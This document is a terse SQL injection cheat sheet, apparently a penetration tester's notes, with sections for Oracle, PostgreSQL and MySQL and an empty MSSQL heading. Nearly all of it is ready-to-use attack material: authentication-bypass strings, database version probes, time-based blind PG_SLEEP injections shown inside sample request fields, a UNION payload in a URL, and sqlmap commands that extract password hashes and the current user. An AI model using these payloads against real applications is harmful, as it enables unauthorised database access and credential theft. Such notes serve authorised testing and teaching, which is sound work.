
# ORACLE

**Fuzzing**

' or '1'='1
' or '1'='1' --
') AND ('1'='1

**Confirm DB version**

' or (SELECT BANNER FROM v$version)='Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production

') AND ((SELECT BANNER FROM v$version)='Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production

**Confirm/Control Rows and Columns**

' or '1'='1' ORDER BY 7 OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY --



**sqlmap**

python sqlmap.py -r req.txt --batch --proxy="https://127.0.0.1:8000" --force-ssl --dbms=ORACLE -p tradeTypes

python sqlmap.py -r req.txt --batch --proxy="https://127.0.0.1:8000" --force-ssl --dbms=ORACLE -p tradeTypes --banner --passwords --current-user

python sqlmap.py -r req.txt --batch --proxy="https://127.0.0.1:8000" --force-ssl --dbms=ORACLE --flush-session

# PostgreSQL

**Fuzzing**

1 AND 1::int=1      (You can determine that the backend database engine is PostgreSQL by using the :: cast operator.)

 
' AND 2164=(SELECT 2164 FROM PG_SLEEP(5))-- XYZ
');SELECT PG_SLEEP(5)--
');(SELECT 4564 FROM PG_SLEEP(5))--  

Example: "ProductId": "ABCD0003' AND 2164=(SELECT 2164 FROM PG_SLEEP(5))-- XYZ", ....
Example: "ProductId": "ABCD0003');SELECT PG_SLEEP(5)--XYZ", ...
EXAMPLE: handle=xxx&display_name=xxx&invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--&age=25&terms=on&rules=on
          

**Confirm DB version**

https://www.example.com/store.php?id=1 UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1--


**Payloads**
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md

# MySQL

**Fuzzing**

' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
'='
'LIKE'
'=0--+
,') or 1=1;-- 


**payloads**

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md

# MSSQL